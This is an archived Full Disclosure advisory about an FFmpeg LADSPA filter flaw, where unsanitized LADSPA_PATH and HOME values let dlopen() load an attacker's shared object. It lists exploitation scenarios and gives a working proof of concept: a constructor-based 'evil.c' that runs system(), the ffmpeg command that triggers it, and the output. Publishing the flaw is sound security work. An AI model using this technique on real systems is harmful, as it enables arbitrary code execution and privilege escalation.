---
title: FFmpeg 7.0+ LADSPA Filter Arbitrary Shared Object Loading via Unsanitized Environment Variables
url: https://seclists.org/fulldisclosure/2025/Sep/29
source: Full Disclosure
date: 2025-09-09
fetch_date: 2025-10-02T19:53:00.083258
---

# FFmpeg 7.0+ LADSPA Filter Arbitrary Shared Object Loading via Unsanitized Environment Variables

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](28)
[By Date](date.html#29)
[![Next](/images/right-icon-16x16.png)](30)

[![Previous](/images/left-icon-16x16.png)](28)
[By Thread](index.html#29)
[![Next](/images/right-icon-16x16.png)](30)

![](/shared/images/nst-icons.svg#search)

# FFmpeg 7.0+ LADSPA Filter Arbitrary Shared Object Loading via Unsanitized Environment Variables

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 7 Sep 2025 02:10:16 -0400

---

```
The ladspa audio filter implementation (libavfilter/af_ladspa.c) in FFmpeg
allows unsanitized environment variables to influence dynamic library
loading. Specifically, the filter uses getenv("LADSPA_PATH") and
getenv("HOME") when resolving the plugin shared object (.so) name provided
through the file option. These values are concatenated into a filesystem
path and passed directly into dlopen() without validation or restriction.
Because dlopen() executes the constructor functions of any shared object
immediately upon load, an attacker able to control LADSPA_PATH, HOME, or
write to $HOME/.ladspa or $HOME/.ladspa/lib can execute arbitrary code
inside the FFmpeg process. This issue manifests even if the library does
not export a valid LADSPA interface, because arbitrary code in the
constructor runs before FFmpeg validates the symbol table. The
vulnerability enables arbitrary code execution in the context of the user
or service running FFmpeg. (FFmpeg 7.0--8.0)

Impact

   -

   *Scope:* Any FFmpeg build configured with --enable-ladspa.
   -

   *Impact:* Arbitrary code execution by injecting a malicious .so into the
   plugin search path.
   -

   *Attack Vectors:*
   -

      Manipulation of LADSPA_PATH to point to an attacker-controlled
      directory.
      -

      Placement of malicious .so files in $HOME/.ladspa/ or
      $HOME/.ladspa/lib/.
      -

   *Exploitation Scenarios:*
   -

      A local attacker sets LADSPA_PATH in a wrapper script or systemd unit
      to escalate privileges.
      -

      A malicious user uploads crafted .so files into a writable directory
      used by a multi-user system where FFmpeg runs batch audio processing jobs.
      -

      Sandbox/container escape if FFmpeg is invoked inside a restricted
      environment but $HOME is attacker-controlled.

*Proof of Concept:"evil.c"*
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    fprintf(stderr, "[*] Evil LADSPA plugin loaded! PID=%d\n", getpid());
    system("echo pwned > /tmp/ladspa_poc");
}
--

ffmpeg -f lavfi -i "sine=frequency=1000:duration=1" \
  -af "ladspa=file=evil:plugin=whatever" -f null -

*Output:*
--snip--
Input #0, lavfi, from 'sine=frequency=1000:duration=1':
  Duration: N/A, start: 0.000000, bitrate: 705 kb/s
  Stream #0:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s
[*] Evil LADSPA plugin loaded! PID=1393717
[Parsed_ladspa_0 @ 0xaaaacb6d34e0] Could not find ladspa_descriptor:
/tmp/ladspa/evil.so: undefined symbol: ladspa_descriptor

*Code Execution:*/tmp# cat ladspa_poc
pwned
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](28)
[By Date](date.html#29)
[![Next](/images/right-icon-16x16.png)](30)

[![Previous](/images/left-icon-16x16.png)](28)
[By Thread](index.html#29)
[![Next](/images/right-icon-16x16.png)](30)

### Current thread:

* **FFmpeg 7.0+ LADSPA Filter Arbitrary Shared Object Loading via Unsanitized Environment Variables** *Ron E (Sep 08)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")